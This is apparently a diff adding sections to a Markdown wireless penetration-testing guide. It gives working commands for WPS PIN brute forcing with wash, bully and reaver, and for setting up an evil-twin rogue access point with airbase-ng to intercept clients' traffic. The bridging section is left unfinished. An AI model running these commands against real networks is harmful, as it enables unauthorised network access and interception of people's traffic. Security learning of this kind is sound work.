@@ -76,5 +76,58 @@ Now that you have the handshake, you can use a cracking program like `hashcat` t
 
 
 ## Attacking WPS
+WPS is a mechanism where a client can connect to an AP using a PIN, rather than a complex password. The PIN is made up of 8 digits, with the last digit being a checksum. With WPS 1.0, the first four are checked, and then the last 3 are checked separately. This gives 11,000 possible PINs. However with WPS 2.0, this has since been mitigated.
+
+To get a list of APs with WPS, use `wash`:
+
+`wash -i wlan0mon`
+
+This will show a list like this:
+
+|BSSID              |Ch |dBm  |WPS  |Lck  |Vendor    |ESSID                        |
+|-------------------|---|-----|-----|-----|----------|-----------------------------|
+|FF:FF:FF:FF:FF:FF  | 1 | -58 | 2.0 | No  | Unknown  | Business-Net                |
+|FF:FF:FF:FF:FF:FF  | 1 | -54 | 2.0 | No  | Broadcom | Home                        |
+|FF:FF:FF:FF:FF:FF  | 1 | -24 | 2.0 | No  | Broadcom | Home                        |
+|FF:FF:FF:FF:FF:FF  | 1 | -48 | 2.0 | No  | Broadcom | Home                        |
+|FF:FF:FF:FF:FF:FF  | 1 | -50 | 2.0 | Yes | Broadcom | OfficeJet 6950              |
+|FF:FF:FF:FF:FF:FF  | 1 | -50 | 2.0 | No  | Unknown  | Apathy                      |
+|FF:FF:FF:FF:FF:FF  | 1 | -50 | 1.0 | No  | Unknown  | Car                         |
+
+
+Using the information from `wash` and `airodump-ng`, the PIN can be crute forced using either `bully` or `reaver`
+
+### Bully
+
+`bully wlan0mon -b <BSSID> -e <ESSID> -c <Channel>`
+
+where:   
+`<BSSID>`    - The BSSID of the AP
+`<ESSID>`    - The ESSID of the client
+`<Channel>`  - The channel that the AP is transmitting on
+
+### Reaver
+
+`reaver -i wlan0mon -b <BSSID> -vv`
+
+where:   
+`<BSSID>`    - The BSSID of the AP
+
+## Evil Twin (MiTM)
+`airbase-ng` turns a Wi-Fi adapter into an AP, broadcasting and accepting client connection. To make this possible, two network interfaces are required.
+
+### Creating an AP
+`airbase-ng -a <BSSID> --essid <ESSID> -c <Channel> wlan0mon`
+
+where:   
+`<BSSID>`    - The BSSID of the AP
+`<ESSID>`    - The ESSID of the client
+`<Channel>`  - The channel that the AP is transmitting on
+
+### Bridge the connection
+To allow internet traffic to flow through the rouge AP, a second network interface needs to be configured to allow traffic to seamlessly flow to any unsuspectingly connected clients.
+
+
+
 
 
